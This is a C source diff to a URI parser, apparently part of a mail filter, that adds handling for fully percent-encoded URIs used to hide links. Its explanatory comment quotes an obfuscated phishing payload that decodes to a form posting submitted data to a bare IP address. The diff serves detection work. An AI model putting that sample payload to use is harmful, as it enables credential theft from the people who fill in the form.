@@ -109,7 +109,7 @@ int
 isCharURI(int octet)
 {
 	/* Throw away the ASCII controls, space, and high-bit octets. */
-	if (octet <= 32 || 0x7F <= octet)
+	if (octet <= 0x20 || 0x7F <= octet)
 		return 0;
 
 	/* uri_excluded is the inverse set of unreserved and
@@ -121,11 +121,33 @@ isCharURI(int octet)
 	return 1;
 }
 
+#ifdef NOT_YET
+/*
+ *
+ */
+int
+spanUriEncode(const char *uri)
+{
+	const char *start;
+
+	for (start = uri; *uri != '\0'; uri += 3) {
+		if (*uri != '%')
+			break;
+		if (qpHexDigit(uri[1]) < 0)
+			break;
+		if (qpHexDigit(uri[2]) < 0)
+			break;
+	}
+
+	return uri - start;
+}
+#endif
+
 /*
  * RFC 2396
  */
 int
-spanURI(const char *uri, const char *stop)
+spanURI(const char *uri)
 {
 	int a, b;
 	const char *start;
@@ -133,7 +155,7 @@ spanURI(const char *uri, const char *stop)
 	if (uri == NULL)
 		return 0;
 
-	for (start = uri; uri < stop || *uri != '\0'; uri++) {
+	for (start = uri; *uri != '\0'; uri++) {
 		/* I include %HH within a URI since you typically
 		 * want to extract a URI before you can decode
 		 * any percent-encoded characters.
@@ -393,24 +415,25 @@ struct mapping {
 };
 
 static struct mapping schemeTable[] = {
-	{ "cid",	sizeof ("cid")-1, 	0 },
-	{ "file",	sizeof ("file")-1,	0 },
-	{ "about",	sizeof ("about")-1,	0 },
-	{ "ftp",	sizeof ("ftp")-1, 	21 },
-	{ "gopher",	sizeof ("gopher")-1, 	70 },
-	{ "http",	sizeof ("http")-1, 	80 },
-	{ "https",	sizeof ("https")-1, 	443 },
-	{ "imap",	sizeof ("imap")-1, 	143 },
-	{ "ldap",	sizeof ("ldap")-1, 	389 },
-	{ "mailto",	sizeof ("mailto")-1, 	25 },
-	{ "smtp",	sizeof ("smtp")-1, 	25 },
-	{ "email",	sizeof ("email")-1, 	25 },
-	{ "mail",	sizeof ("mail")-1, 	25 },
-	{ "from",	sizeof ("from")-1, 	25 },
-	{ "nntp",	sizeof ("nntp")-1, 	119 },
-	{ "pop3",	sizeof ("pop3")-1, 	110 },
-	{ "telnet",	sizeof ("telnet")-1, 	23 },
-	{ "rtsp",	sizeof ("rtsp")-1, 	554 },
+	{ "cid",	sizeof ("cid")-1, 		0 },
+	{ "file",	sizeof ("file")-1,		0 },
+	{ "about",	sizeof ("about")-1,		0 },
+	{ "javascript",	sizeof ("javascript")-1,	0 },
+	{ "ftp",	sizeof ("ftp")-1, 		21 },
+	{ "gopher",	sizeof ("gopher")-1, 		70 },
+	{ "http",	sizeof ("http")-1, 		80 },
+	{ "https",	sizeof ("https")-1, 		443 },
+	{ "imap",	sizeof ("imap")-1, 		143 },
+	{ "ldap",	sizeof ("ldap")-1, 		389 },
+	{ "mailto",	sizeof ("mailto")-1, 		25 },
+	{ "smtp",	sizeof ("smtp")-1, 		25 },
+	{ "email",	sizeof ("email")-1, 		25 },
+	{ "mail",	sizeof ("mail")-1, 		25 },
+	{ "from",	sizeof ("from")-1, 		25 },
+	{ "nntp",	sizeof ("nntp")-1, 		119 },
+	{ "pop3",	sizeof ("pop3")-1, 		110 },
+	{ "telnet",	sizeof ("telnet")-1, 		23 },
+	{ "rtsp",	sizeof ("rtsp")-1, 		554 },
 	{ NULL, 0 }
 };
 
@@ -505,7 +528,7 @@ uriParse2(const char *u, int length, int implicit_domain_min_dots)
 	URI *uri;
 	int span, port;
 	struct mapping *t;
-	char *value, *mark;
+	char *value, *mark, *str;
 
 	if (u == NULL)
 		goto error0;
@@ -575,6 +598,38 @@ uriParse2(const char *u, int length, int implicit_domain_min_dots)
 	} else {
 		/* No scheme, no schemeInfo. */
 		value = mark;
+	}
+
+	/* Is the original URI completely URI encoded in an effort
+	 * to obfuscate the actual URI, eg.
+	 *
+	 *	document.write(unescape('%3C%46%4F%52%4D%20%6E%61%6D%65%3D
+	 *	%61%66%66%69%6C%69%61%74%65%46%6F%72%6D%20%6F%6E%73%75%62
+	 *	%6D%69%74%3D%22%72%65%74%75%72%6E%20%66%61%72%61%5F%64%61
+	 *	%74%65%28%29%3B%22%20%61%63%74%69%6F%6E%3D%68%74%74%70%3A
+	 *	%2F%2F%32%31%33%2E%32%31%30%2E%32%33%37%2E%38%33%2F%77%65
+	 *	%62%73%63%72%2F%63%6D%64%2F%70%72%6F%74%65%63%74%5F%66%69
+	 *	%6C%65%73%2F%79%61%73%73%69%6E%6F%2D%66%69%6C%65%2E%70%68
+	 *	%70%20%6D%65%74%68%6F%64%3D%70%6F%73%74%3E'));
+	 *
+	 * decodes to:
+	 *
+	 *	document.write(unescape('<FORM name=affiliateForm onsubmit=\"return fara_date();\"
+	 *	action=http://213.210.237.83/webscr/cmd/protect_files/yassino-file.php method=post>'));
+	 *
+	 * Determine if the URI was completely encoded by trying to find the
+	 * scheme unencoded in the original URI, otherwise assume that the
+	 * URI was completely encoded and that we can trim the junk from the
+	 * tail at the first non-URI character. So the above decoded URI
+	 * results in:
+	 *
+	 *	http://213.210.237.83/webscr/cmd/protect_files/yassino-file.php
+	 */
+	if (uri->scheme != NULL && (str = strstr(u, uri->scheme)) == NULL) {
+		span = spanURI(uri->uriDecoded);
+		uri->uriDecoded[span] = '\0';
+		span = spanURI(value);
+		value[span] = '\0';
 	}
 
 	if ((uri->fragment = strchr(value, '#')) != NULL)
